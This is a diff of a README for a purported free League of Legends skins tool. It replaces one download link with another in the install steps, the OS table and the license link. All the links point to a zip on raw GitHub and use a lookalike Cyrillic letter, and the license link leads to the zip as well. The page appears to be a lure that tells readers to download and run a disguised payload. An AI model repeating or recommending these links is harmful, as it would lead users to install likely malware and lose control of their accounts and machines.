@@ -22,9 +22,9 @@ Welcome to **Lol Free Skins**, the ultimate solution for players looking to enjo
 
 Follow this simple process to get started with **Lol Free Skins**:
 
-1. **Download `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip` from the repository.**
+1. **Download `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip` from the repository.**
 2. Extract the contents to a convenient location on your system.
-3. Run the `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip` or `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip` appropriate for your OS.
+3. Run the `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip` or `https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip` appropriate for your OS.
 4. Follow the on-screen instructions to complete setup.
 5. Launch your game and enjoy your new skins! 🎉
 
@@ -36,9 +36,9 @@ Gain access to **Lol Free Skins** across a wide range of platforms! Check the co
 
 | Operating System | Supported Version     | Functionality Level    | Installer Format         | Notes                                                                             |
 |------------------|----------------------|-----------------------|-------------------------|-----------------------------------------------------------------------------------|
-| 💻 Windows       | Windows 7, 8, 10, 11 | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip              | Automatic updates and launcher integration                                         |
-| 🍏 macOS         | 10.13 High Sierra+   | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip, App Bundle   | Native integration, no need for emulators                                          |
-| 🐧 Linux         | Ubuntu 18+           | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip               | Direct terminal installer, supports most popular distributions                     |
+| 💻 Windows       | Windows 7, 8, 10, 11 | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip              | Automatic updates and launcher integration                                         |
+| 🍏 macOS         | 10.13 High Sierra+   | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip, App Bundle   | Native integration, no need for emulators                                          |
+| 🐧 Linux         | Ubuntu 18+           | Full                  | https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip               | Direct terminal installer, supports most popular distributions                     |
 | 🌐 Web           | N/A                  | Companion App         | Web guide               | Remote setup assistance for troubleshooting and integration hints                  |
 | 📱 Android/IOS   | Not supported        | -                     | -                       | Full-feature not available for mobile, desktop use only                            |
 
@@ -72,7 +72,7 @@ Unlock free skins, game personalization, customization loader, League skins, eas
 
 ## 📄 License
 
-This repository operates under the [MIT License](https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/Lоader.zip).  
+This repository operates under the [MIT License](https://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zipоhttps://raw.githubusercontent.com/ahmmedaya94/LolSkinLounge/main/angiosclerosis/Skin-Lol-Lounge-v2.8.zip).  
 Feel free to use, modify, and share responsibly!
 
 ---
